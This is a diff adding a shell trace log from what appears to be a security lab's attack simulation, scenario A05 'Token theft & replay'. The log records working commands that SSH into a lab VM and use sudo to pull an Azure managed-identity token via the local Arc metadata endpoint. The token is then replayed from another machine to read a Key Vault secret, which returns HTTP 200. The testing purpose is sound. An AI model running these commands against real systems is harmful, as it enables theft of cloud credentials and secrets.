@@ -1,0 +1,20 @@
++ SCENARIOS=(a01 a02 a03 a04 a05 a07 a06)
++ [[ 1 -gt 0 ]]
++ SCENARIOS=("$@")
++ for s in "${SCENARIOS[@]}"
++ a05
++ banner 'A05 Token theft & replay from another machine' $'ATT&CK T1528, T1550.001 \302\267 threat T02 \302\267 control SC-7 \302\267 expect: works from the SAME public IP (finding), fails elsewhere'
++ printf '\n\033[1;35m### %s\033[0m\n%s\n' 'A05 Token theft & replay from another machine' $'ATT&CK T1528, T1550.001 \302\267 threat T02 \302\267 control SC-7 \302\267 expect: works from the SAME public IP (finding), fails elsewhere'
+
+[1;35m### A05 Token theft & replay from another machine[0m
+ATT&CK T1528, T1550.001 · threat T02 · control SC-7 · expect: works from the SAME public IP (finding), fails elsewhere
+++ as ztadmin 'sudo bash -c '\''R=$(curl -s -D - -o /dev/null -H Metadata:true "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net" | grep -i ^WWW-Authenticate | sed "s/.*realm=//" | tr -d "\r"); curl -s -H Metadata:true -H "Authorization: Basic $(cat $R)" "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net"'\'''
+++ local u=ztadmin
+++ shift
+++ ssh -i .state/vbox/zt_lab_ed25519 -o UserKnownHostsFile=.state/vbox/known_hosts -o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 -o BatchMode=yes ztadmin@192.168.56.10 'sudo bash -c '\''R=$(curl -s -D - -o /dev/null -H Metadata:true "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net" | grep -i ^WWW-Authenticate | sed "s/.*realm=//" | tr -d "\r"); curl -s -H Metadata:true -H "Authorization: Basic $(cat $R)" "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net"'\'''
+++ python -c 'import sys,json; print(json.load(sys.stdin)["access_token"])'
++ tok=<JWT_REDACTED>
++ echo $'stolen token: eyJ0eXAiOiJK\342\200\246 (len 1871) \342\200\224 exfiltrated to the laptop'
+stolen token: eyJ0eXAiOiJK… (len 1871) — exfiltrated to the laptop
+++ curl -s -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer <JWT_REDACTED>' 'https://sc500kvzt1028182.vault.azure.net//secrets/app-db-password?api-version=7.4'
++ code=200
